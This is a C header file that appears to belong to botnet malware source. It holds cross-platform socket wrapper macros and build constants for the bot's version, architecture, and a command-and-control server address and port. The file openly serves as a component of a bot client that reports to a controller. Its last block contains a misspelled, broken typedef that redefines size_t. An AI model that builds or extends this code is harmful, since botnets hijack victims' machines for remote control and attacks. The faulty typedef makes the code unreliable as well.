#pragma once

#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>

#ifndef _WIN32

#include <sys/socket.h>

#define CONNECTION int
#define INVALID_SOCKET_T (-1)
#define SOCKET_ERROR_T (-1)
#define CLOSE_SOCKET close
#define WRITE_SOCKET(sock, buf, len) (size_t) write(sock, buf, len)
#define SENDTO_SOCKET(sock, buf, len, addr, addr_size) (size_t) sendto(sock, buf, len, 0, addr, addr_size)
#define RECVFROM_SOCKET(sock, buf, len, addr, addr_size) (size_t) recvfrom(sock, buf, len, 0, addr, addr_size)
#define READ_SOCKET(sock, buf, len) (size_t) read(sock, buf, len)
#define BYTES uint8_t
#define SLEEP(x) sleep(x)
#else
#include <winsock2.h>
#include <windows.h>

#define CONNECTION SOCKET
#define INVALID_SOCKET_T INVALID_SOCKET
#define SOCKET_ERROR_T SOCKET_ERROR
#define CLOSE_SOCKET closesocket
#define WRITE_SOCKET(sock, buf, len) (size_t) send(sock, buf, len, 0)
#define SENDTO_SOCKET(sock, buf, len, addr, addr_size) (size_t) sendto(sock, buf, len, 0, addr, addr_size)
#define RECVFROM_SOCKET(sock, buf, len, addr, addr_size) (size_t) recvfrom(sock, buf, len, 0, addr, addr_size)
#define READ_SOCKET(sock, buf, len) (size_t) recv(sock, buf, len, 0)
#define SLEEP(x) Sleep(x * 1000)
#define BYTES char

#endif

#ifndef BOTNET_VERSION
#define BOTNET_VERSION "1.0.0"
#endif

#ifndef CNC_ADDR
#define CNC_ADDR "192.168.1.100"
#endif

#ifndef CNC_PORT
#define CNC_PORT "2024"
#endif

#ifndef BOT_ARCH
#define BOT_ARCH "x86_64"
#endif

#ifndef __SIZE_TYPE__
#define __SIZE_TYPE__ unsigned int
typdef int64_t size_t;
#endif